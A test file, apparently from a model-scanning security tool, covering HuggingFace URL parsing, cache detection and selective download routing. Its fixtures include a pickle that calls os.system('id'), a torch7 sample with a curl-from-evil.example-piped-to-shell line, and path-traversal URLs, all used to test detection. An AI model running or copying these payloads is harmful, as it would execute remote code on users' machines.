"""Tests for HuggingFace URL handling."""

import importlib
import os
import pickle
import signal
import struct
import subprocess
import tarfile
import time
import zipfile
from collections.abc import Callable, Iterator
from io import BytesIO
from pathlib import Path
from types import SimpleNamespace
from typing import cast
from unittest.mock import ANY, MagicMock, call, patch

import pytest

from modelaudit.utils.file.detection import detect_file_format_for_skip_filter
from modelaudit.utils.sources._huggingface_download_worker import _run_operation as _run_huggingface_worker_operation
from modelaudit.utils.sources.huggingface import (
    _get_huggingface_path_sizes,
    _HuggingFaceProbeBudget,
    _list_huggingface_repo_files_at_revision,
    _list_repo_files_with_timeout,
    _read_huggingface_prefix,
    _run_huggingface_download_with_deadline,
    _select_streamable_hf_files,
    _terminate_huggingface_download_process,
    download_file_from_hf,
    download_model,
    download_model_streaming,
    extract_model_id_from_path,
    get_model_info,
    get_model_size,
    is_huggingface_cache_path,
    is_huggingface_file_url,
    is_huggingface_url,
    parse_huggingface_file_url,
    parse_huggingface_url,
    redact_huggingface_url_for_display,
)
from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs
from tests.helpers import create_mock_coreml, create_mock_onnx

_HF_TEST_REVISION = "a" * 40


class _FakeRangeResponse:
    def __init__(
        self,
        payload: bytes,
        *,
        headers: dict[str, str] | None = None,
        status_code: int = 200,
    ) -> None:
        self.payload = payload
        self.headers = headers if headers is not None else {"Content-Length": str(len(payload))}
        self.status_code = status_code

    def __enter__(self) -> "_FakeRangeResponse":
        return self

    def __exit__(self, *_exc_info: object) -> None:
        return None

    def raise_for_status(self) -> None:
        return None

    def iter_content(self, chunk_size: int) -> Iterator[bytes]:
        yield self.payload[:chunk_size]


def _make_tar_payload() -> bytes:
    payload = BytesIO()
    with tarfile.open(fileobj=payload, mode="w") as archive:
        info = tarfile.TarInfo("weights.bin")
        info.size = len(b"weights")
        info.mtime = 0
        archive.addfile(info, BytesIO(b"weights"))
    return payload.getvalue()


def _make_executable_zip_polyglot_payload() -> bytes:
    payload = BytesIO()
    with zipfile.ZipFile(payload, "w") as archive:
        archive.writestr("model.pkl", b"payload")
    return b"\x7fELF" + b"\x02\x01\x01\x00" + (b"\x00" * 56) + payload.getvalue()


def _ubjson_key(key: bytes) -> bytes:
    return b"U" + bytes([len(key)]) + key


def _make_xgboost_ubjson_payload() -> bytes:
    return (
        b"{"
        + _ubjson_key(b"learner")
        + b"{"
        + _ubjson_key(b"learner_model_param")
        + b"{}"
        + b"}"
        + _ubjson_key(b"version")
        + b"[]"
        + b"}"
    )


def _make_tensorflow_savedmodel_payload(_tmp_path: Path) -> bytes:
    if not has_tensorflow_protobuf_stubs():
        pytest.skip("TensorFlow protobuf stubs unavailable")
    import modelaudit.protos  # noqa: F401

    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
    saved_model = saved_model_pb2.SavedModel()
    saved_model.saved_model_schema_version = 1
    node = saved_model.meta_graphs.add().graph_def.node.add()
    node.name = "pyfunc_node"
    node.op = "PyFunc"
    return cast(bytes, saved_model.SerializeToString())


def _make_coreml_payload(tmp_path: Path) -> bytes:
    return create_mock_coreml(tmp_path / "fixture.mlmodel").read_bytes()


def _make_onnx_payload(tmp_path: Path) -> bytes:
    pytest.importorskip("onnx")
    return create_mock_onnx(tmp_path / "fixture.onnx", op_type="PythonOp").read_bytes()


TEST_COMMIT_SHA = "a" * 40


class TestHuggingFaceURLDetection:
    """Test HuggingFace URL detection."""

    def test_valid_huggingface_urls(self):
        """Test that valid HuggingFace URLs are detected."""
        valid_urls = [
            "https://huggingface.co/bert-base-uncased",
            "https://huggingface.co/gpt2/model",
            "https://hf.co/facebook/bart-large",
            "hf://llama/llama-7b",
            "http://huggingface.co/test/model",
            "https://user:pass@huggingface.co/test/model?token=hf_secret",
        ]
        for url in valid_urls:
            assert is_huggingface_url(url), f"Failed to detect valid URL: {url}"

    def test_invalid_huggingface_urls(self):
        """Test that invalid URLs are not detected as HuggingFace URLs."""
        invalid_urls = [
            "https://github.com/user/repo",
            "https://example.com/model",
            "/path/to/local/file",
            "file:///path/to/file",
            "s3://bucket/key",
            "",
            "huggingface.co/model",  # Missing protocol
        ]
        for url in invalid_urls:
            assert not is_huggingface_url(url), f"Incorrectly detected invalid URL: {url}"


class TestHuggingFaceURLParsing:
    """Test HuggingFace URL parsing."""

    def test_parse_https_urls(self):
        """Test parsing HTTPS HuggingFace URLs."""
        test_cases = [
            ("https://huggingface.co/bert-base/uncased", ("bert-base", "uncased")),
            ("https://hf.co/facebook/bart-large", ("facebook", "bart-large")),
            ("https://huggingface.co/user/model/", ("user", "model")),
        ]
        for url, expected in test_cases:
            namespace, repo = parse_huggingface_url(url)
            assert (namespace, repo) == expected, f"Failed to parse {url}"

    def test_parse_hf_protocol_urls(self):
        """Test parsing hf:// protocol URLs."""
        test_cases = [
            ("hf://bert-base/uncased", ("bert-base", "uncased")),
            ("hf://facebook/bart-large", ("facebook", "bart-large")),
            ("hf://user/model/", ("user", "model")),
        ]
        for url, expected in test_cases:
            namespace, repo = parse_huggingface_url(url)
            assert (namespace, repo) == expected, f"Failed to parse {url}"

    def test_parse_single_component_urls(self):
        """Test parsing single-component URLs (models without namespaces)."""
        test_cases = [
            ("https://huggingface.co/gpt2", ("gpt2", "")),
            ("https://hf.co/bert-base-uncased", ("bert-base-uncased", "")),
            ("hf://gpt2", ("gpt2", "")),
            ("hf://bert-base-uncased", ("bert-base-uncased", "")),
        ]
        for url, expected in test_cases:
            namespace, repo = parse_huggingface_url(url)
            assert (namespace, repo) == expected, f"Failed to parse {url}"

    def test_parse_invalid_urls(self):
        """Test that invalid URLs raise ValueError."""
        invalid_urls = [
            "https://github.com/user/repo",
            "hf://",  # Empty path
            "",  # Empty string
        ]
        for url in invalid_urls:
            with pytest.raises(ValueError):
                parse_huggingface_url(url)

    @pytest.mark.parametrize(
        "url",
        [
            "https://huggingface.co/%2e%2e/model",
            "https://huggingface.co/org/%2e%2e",
            "https://huggingface.co/org/repo%2F..%2Fescape",
            "hf://org%2F..%2Fescape/model",
            "hf://org/repo%5Cescape",
        ],
    )
    def test_parse_rejects_unsafe_repo_components(self, url: str) -> None:
        """Decoded repo-id components must not become path traversal segments."""
        with pytest.raises(ValueError):
            parse_huggingface_url(url)

        assert is_huggingface_url(url) is False


class TestExtractModelIdFromPath:
    """Test HuggingFace model ID extraction from local paths."""

    @pytest.mark.parametrize(
        ("url", "model_id"),
        [
            ("https://huggingface.co/gpt2/resolve/main/config.json", "gpt2"),
            ("https://huggingface.co/user/repo/resolve/refs%2Fpr%2F1/model.bin", "user/repo"),
        ],
    )
    def test_extract_model_id_from_direct_file_url(self, url: str, model_id: str) -> None:
        """Direct file URLs should retain their repository provenance."""
        assert extract_model_id_from_path(url) == (model_id, "huggingface")

    def test_extract_model_id_from_local_config(self, tmp_path: Path) -> None:
        """Local config metadata should still be extracted as local provenance."""
        model_dir = tmp_path / "model"
        model_dir.mkdir()
        model_path = model_dir / "weights.bin"
        model_path.write_bytes(b"weights")
        (model_dir / "config.json").write_text('{"_name_or_path": "Qwen/Qwen2.5-0.5B"}')

        assert extract_model_id_from_path(str(model_path)) == ("Qwen/Qwen2.5-0.5B", "local")

    def test_extract_model_id_from_hf_cache_path(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Local HuggingFace cache paths should use distinct cache provenance."""
        hf_home = tmp_path / ".cache" / "huggingface"
        monkeypatch.setenv("HF_HOME", str(hf_home))
        model_path = hf_home / "hub" / "models--Qwen--Qwen2.5-0.5B" / "snapshots" / "abc123" / "weights.bin"
        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")

        assert extract_model_id_from_path(str(model_path)) == ("Qwen/Qwen2.5-0.5B", "huggingface_cache")

    def test_extract_model_id_from_hf_home_cache_path(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """HF_HOME relocation should still be recognized as HuggingFace cache provenance."""
        monkeypatch.setenv("HF_HOME", str(tmp_path / "custom-hf-home"))
        model_path = (
            tmp_path / "custom-hf-home" / "hub" / "models--Qwen--Qwen2.5-0.5B" / "snapshots" / "abc123" / "weights.bin"
        )
        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")

        assert extract_model_id_from_path(str(model_path)) == ("Qwen/Qwen2.5-0.5B", "huggingface_cache")

    def test_extract_model_id_from_symlinked_hf_home_cache_path(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Resolved cache roots should still match paths reached through symlinked HF_HOME."""
        real_home = tmp_path / "real-hf-home"
        link_home = tmp_path / "link-hf-home"
        real_home.mkdir()
        try:
            link_home.symlink_to(real_home, target_is_directory=True)
        except OSError as exc:
            pytest.skip(f"symlink creation unavailable: {exc}")

        monkeypatch.setenv("HF_HOME", str(link_home))
        model_path = link_home / "hub" / "models--Qwen--Qwen2.5-0.5B" / "snapshots" / "abc123" / "weights.bin"
        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")

        assert extract_model_id_from_path(str(model_path)) == ("Qwen/Qwen2.5-0.5B", "huggingface_cache")

    def test_extract_model_id_from_hf_hub_cache_path(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """HF_HUB_CACHE relocation should override the default HuggingFace cache root."""
        monkeypatch.setenv("HF_HOME", str(tmp_path / "ignored-home"))
        monkeypatch.setenv("HF_HUB_CACHE", str(tmp_path / "custom-hub-root"))
        model_path = (
            tmp_path / "custom-hub-root" / "models--Qwen--Qwen2.5-0.5B" / "snapshots" / "abc123" / "weights.bin"
        )
        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")

        assert extract_model_id_from_path(str(model_path)) == ("Qwen/Qwen2.5-0.5B", "huggingface_cache")

    def test_hf_cache_path_resolution_handles_symlink_loop(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        requires_symlinks: None,
    ) -> None:
        """Looped cache symlinks should not abort HuggingFace cache provenance checks."""
        hf_home = tmp_path / "hf-home"
        monkeypatch.setenv("HF_HOME", str(hf_home))
        model_root = hf_home / "hub" / "models--Qwen--Qwen2.5-0.5B"
        model_root.mkdir(parents=True)
        loop_path = model_root / "snapshots"
        loop_path.symlink_to(loop_path, target_is_directory=True)

        looped_metadata_path = loop_path / "abc123" / "model.metadata"

        assert is_huggingface_cache_path(looped_metadata_path) is True

    def test_extract_model_id_rejects_spoofed_models_directory(self, tmp_path: Path) -> None:
        """A local models--* directory without HF cache layout should not be treated as HuggingFace."""
        model_path = tmp_path / "models--Qwen--Qwen2.5-0.5B" / "weights.bin"
        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")

        assert extract_model_id_from_path(str(model_path)) == (None, None)

    def test_extract_model_id_rejects_spoofed_hf_cache_root(self, tmp_path: Path) -> None:
        """Only the real .cache/huggingface/hub layout should count as HF cache provenance."""
        model_path = (
            tmp_path
            / "project"
            / "huggingface"
            / "hub"
            / "models--Qwen--Qwen2.5-0.5B"
            / "snapshots"
            / "abc123"
            / "weights.bin"
        )
        model_path.parent.mkdir(parents=True)
        model_path.write_bytes(b"weights")

        assert extract_model_id_from_path(str(model_path)) == (None, None)


class TestModelDownload:
    """Test model downloading functionality."""

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_success(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Test successful model download."""
        # Mock the snapshot_download to return a path
        mock_path = tmp_path / "test_model"
        mock_path.mkdir()
        (mock_path / "model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(mock_path)

        # Test download
        result = download_model("https://huggingface.co/test/model")

        # Verify the download was called correctly
        mock_snapshot_download.assert_called_once()
        call_args = mock_snapshot_download.call_args
        assert call_args[1]["repo_id"] == "test/model"
        assert result == mock_path

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_with_cache_dir(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Test model download with custom cache directory."""
        mock_path = tmp_path / "test" / "model"
        mock_path.mkdir(parents=True)
        (mock_path / "model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(mock_path)

        cache_dir = tmp_path / "custom_cache"
        download_model("hf://test/model", cache_dir=cache_dir)

        # Verify cache directory was used (we now use local_dir instead of cache_dir for safety)
        call_args = mock_snapshot_download.call_args
        assert call_args[1]["local_dir"] == str(cache_dir / "huggingface" / "test" / "model")

    @patch("modelaudit.utils.sources.huggingface.get_model_size", return_value=None)
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_revalidates_existing_cache(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_model_size: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Existing local cache directories should still delegate freshness checks to the HF SDK."""
        cache_dir = tmp_path / "custom_cache"
        existing_path = cache_dir / "huggingface" / "test" / "model"
        existing_path.mkdir(parents=True)
        (existing_path / "config.json").write_text("{}", encoding="utf-8")
        (existing_path / "model.bin").write_bytes(b"stale bytes")
        mock_snapshot_download.return_value = str(existing_path)

        result = download_model("hf://test/model", cache_dir=cache_dir)

        assert result == existing_path
        mock_snapshot_download.assert_called_once()
        assert mock_snapshot_download.call_args.kwargs["local_dir"] == str(existing_path)

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(None, None, "repo listing failed"),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_listing_error_fails_closed(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """Listing failures must not silently skip renamed content-routed payloads."""
        with pytest.raises(Exception, match=r"selective filtering incomplete.*repo listing failed"):
            download_model("https://huggingface.co/test/model")

        mock_snapshot_download.assert_not_called()

    @patch("huggingface_hub.snapshot_download")
    def test_download_model_listing_timeout_fails_closed(
        self,
        mock_snapshot_download: MagicMock,
    ) -> None:
        """Listing timeouts must not silently skip renamed content-routed payloads."""

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(None, None, "timed out after 30 seconds"),
            ),
            pytest.raises(Exception, match=r"selective filtering incomplete.*timed out after 30 seconds"),
        ):
            download_model("https://huggingface.co/test/model")

        mock_snapshot_download.assert_not_called()

    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_timeout_uses_hfapi_timeout(self, mock_repo_info: MagicMock) -> None:
        """Timeout helper should use the request-layer timeout instead of background threads."""
        mock_repo_info.return_value = SimpleNamespace(
            sha=_HF_TEST_REVISION,
            siblings=[SimpleNamespace(rfilename="config.json")],
        )

        repo_files, revision, error = _list_repo_files_with_timeout("test/model", timeout_seconds=7)

        assert repo_files == ["config.json"]
        assert revision == _HF_TEST_REVISION
        assert error is None
        mock_repo_info.assert_called_once_with("test/model", timeout=7, files_metadata=False)

    @patch("modelaudit.utils.sources.huggingface._run_huggingface_worker_with_deadline")
    def test_list_repo_files_deadline_uses_terminable_worker(self, mock_run_worker: MagicMock) -> None:
        """Deadline-bound listings must be terminable, not only socket-timeout bounded."""
        mock_run_worker.return_value = {
            "value": {"files": ["config.json"], "revision": _HF_TEST_REVISION},
        }

        repo_files, revision, error = _list_repo_files_with_timeout(
            "test/model",
            timeout_seconds=7,
            deadline=123.0,
        )

        assert repo_files == ["config.json"]
        assert revision == _HF_TEST_REVISION
        assert error is None
        mock_run_worker.assert_called_once_with(
            "list_repo_files",
            {"repo_id": "test/model", "request_timeout": 7},
            123.0,
            "test/model",
        )

    @patch("huggingface_hub.HfApi.repo_info")
    def test_download_worker_serializes_repository_listing(self, mock_repo_info: MagicMock) -> None:
        """The deadline worker should return only serializable listing evidence."""
        mock_repo_info.return_value = SimpleNamespace(
            sha=_HF_TEST_REVISION,
            siblings=[SimpleNamespace(rfilename="model.bin"), {"path": "config.json"}],
        )

        result = _run_huggingface_worker_operation(
            "list_repo_files",
            {"repo_id": "test/model", "request_timeout": 7},
        )

        assert result == {
            "value": {"files": ["model.bin", "config.json"], "revision": _HF_TEST_REVISION},
        }
        mock_repo_info.assert_called_once_with("test/model", timeout=7, files_metadata=False)

    @pytest.mark.parametrize("revision", [None, "", "main", "g" * 40])
    @patch("huggingface_hub.HfApi.repo_info")
    def test_list_repo_files_rejects_non_commit_revision(
        self,
        mock_repo_info: MagicMock,
        revision: str | None,
    ) -> None:
        """Selective filtering must not trust a mutable or malformed repository revision."""
        mock_repo_info.return_value = SimpleNamespace(
            sha=revision,
            siblings=[SimpleNamespace(rfilename="model.bin")],
        )

        repo_files, pinned_revision, error = _list_repo_files_with_timeout("test/model")

        assert repo_files == ["model.bin"]
        assert pinned_revision is None
        assert error == "repository listing did not include an immutable commit SHA"

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "evil.payload"], None, "repository listing missing immutable revision"),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_fails_closed_without_immutable_revision(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """Snapshot filtering must stop before probing or downloading a mutable revision."""
        with pytest.raises(Exception, match="repository listing missing immutable revision"):
            download_model("https://huggingface.co/test/model")

        mock_requests_get.assert_not_called()
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["weights[latest].bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_escapes_selected_filenames_as_exact_allow_patterns(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Untrusted repository filenames must not change snapshot glob selection."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "config.json").write_text("{}")
        (download_path / "weights[latest].bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["weights[[]latest].bin"]

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "evil.payload", "preview.png"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_includes_content_routed_skipped_file(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Selective snapshot downloads should include renamed content-routed model files."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        (download_path / "evil.payload").write_bytes(b"\x08\x00\x00\x00TFL3" + b"\x00" * 16)
        mock_snapshot_download.return_value = str(download_path)

        def get_side_effect(url: str, **_kwargs: object) -> _FakeRangeResponse:
            if url.endswith("/evil.payload"):
                return _FakeRangeResponse(b"\x08\x00\x00\x00TFL3" + b"\x00" * 16)
            return _FakeRangeResponse(b"\x89PNG\r\n\x1a\n" + b"\x00" * 16)

        mock_requests_get.side_effect = get_side_effect

        download_model("https://huggingface.co/test/model")

        allow_patterns = mock_snapshot_download.call_args.kwargs["allow_patterns"]
        assert allow_patterns == ["pytorch_model.bin", "evil.payload"]
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION
        assert all(f"/resolve/{_HF_TEST_REVISION}/" in call.args[0] for call in mock_requests_get.call_args_list)
        assert all(call.kwargs["headers"]["Accept-Encoding"] == "identity" for call in mock_requests_get.call_args_list)

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_accepts_content_routed_only_snapshot(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Post-download verification should recognize selected renamed model payloads."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "hidden.payload").write_bytes(b"\x08\x00\x00\x00TFL3" + b"\x00" * 16)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(b"\x08\x00\x00\x00TFL3" + b"\x00" * 16)

        assert download_model("https://huggingface.co/test/model") == download_path
        assert detect_file_format_for_skip_filter(str(download_path / "hidden.payload")) == "tflite"

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_fails_closed_when_snapshot_omits_selected_file(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Snapshot downloads must contain every file selected during immutable preflight."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "config.json").write_text("{}")
        mock_snapshot_download.return_value = str(download_path)

        with pytest.raises(Exception, match=r"snapshot missing 1 selected file\(s\) for test/model"):
            download_model("https://huggingface.co/test/model")

    @pytest.mark.parametrize(
        "payload, expected_format",
        [
            (
                struct.pack("<Q", len(b'{"weight":{"dtype":"F32","shape":[1],"data_offsets":[0,4]}}'))
                + b'{"weight":{"dtype":"F32","shape":[1],"data_offsets":[0,4]}}'
                + b"\x00\x00\x00\x00",
                "safetensors",
            ),
            (pickle.dumps({"weights": [1, 2, 3]}, protocol=0), "pickle"),
            (
                (b"\x8c\x01x0" * 8) + b"\x8c\x02os\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.",
                "pickle",
            ),
            (
                (b"\x8c\x01x0" * ((8 * 1024) // 4))
                + b"\x8c\x02os\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94.",
                "pickle",
            ),
            (_make_tar_payload(), "tar"),
            (b"\x0a\x07version\x0a\x03uidCompositeFunction", "cntk"),
            (
                b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\n"
                b"max_feature_idx=0\ntree=0\nnum_leaves=1\nsplit_feature=0\nleaf_value=0\n",
                "lightgbm",
            ),
            (b'<?xml version="1.0" encoding="UTF-8"?><PMML version="4.4"></PMML>', "pmml"),
            (b'{"orbax_version":"1.0","framework":"jax"}', "jax_checkpoint"),
            (
                b'{"nodes":[{"op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
                "mxnet",
            ),
            (b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x04\x00\x00\x00", "executorch"),
            (b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03", "flax_msgpack"),
            (
                b"\xdb" + (9000).to_bytes(4, "big") + b"x" * 9000 + b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03",
                "flax_msgpack",
            ),
            (
                b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
                b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
                b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n",
                "torch7",
            ),
            (b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime\n", "llamafile"),
            (_make_executable_zip_polyglot_payload(), "executable_zip_polyglot"),
        ],
        ids=[
            "safetensors",
            "protocol0-pickle",
            "delayed-protocolless-binary-pickle",
            "protocolless-binary-pickle-beyond-probe-budget",
            "tar",
            "cntk",
            "lightgbm",
            "pmml-xml",
            "jax-json",
            "mxnet",
            "executorch",
            "flax-msgpack",
            "flax-msgpack-delayed-root",
            "torch7",
            "llamafile",
            "executable-zip-polyglot",
        ],
    )
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_includes_bounded_content_routed_payloads(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
        payload: bytes,
        expected_format: str,
    ) -> None:
        """Selective downloads should preserve renamed payloads recognized by bounded probes."""
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        (download_path / "hidden.payload").write_bytes(payload)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin", "hidden.payload"]
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION
        assert detect_file_format_for_skip_filter(str(download_path / "hidden.payload")) == expected_format

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "model"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_includes_extensionless_xgboost_ubjson(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Extensionless XGBoost UBJSON should survive remote and local routing."""
        payload = _make_xgboost_ubjson_payload()
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        xgboost_path = download_path / "model"
        xgboost_path.write_bytes(payload)
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin", "model"]
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION
        assert detect_file_format_for_skip_filter(str(xgboost_path)) == "xgboost"

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "model.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_skips_suffixed_xgboost_ubjson(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Remote routing should match the extensionless-only local XGBoost contract."""
        payload = _make_xgboost_ubjson_payload()
        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin"]
        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION

    @pytest.mark.parametrize("filename", ["checkpoint.py", "checkpoint.pyw"])
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch("requests.get")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_skips_jax_json_source_files(
        self,
        mock_snapshot_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_get_extensions: MagicMock,
        filename: str,
        tmp_path: Path,
    ) -> None:
        """Remote JAX routing should preserve the local source-file exclusions."""
        payload = b'{"orbax_version":"1.0","framework":"jax"}'
        with patch(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            return_value=(["pytorch_model.bin", filename], _HF_TEST_REVISION, None),
        ):
            download_path = tmp_path / "download"
            download_path.mkdir()
            (download_path / "pytorch_model.bin").write_bytes(b"weights")
            mock_snapshot_download.return_value = str(download_path)
            mock_requests_get.return_value = _FakeRangeResponse(payload)

            download_model("https://huggingface.co/test/model")

        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin"]

    @pytest.mark.parametrize(
        "payload_factory, expected_format",
        [
            (_make_tensorflow_savedmodel_payload, "tf_savedmodel"),
            (_make_coreml_payload, "coreml"),
            (_make_onnx_payload, "onnx"),
        ],
        ids=["tensorflow-protobuf", "coreml-protobuf", "onnx-protobuf"],
    )
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
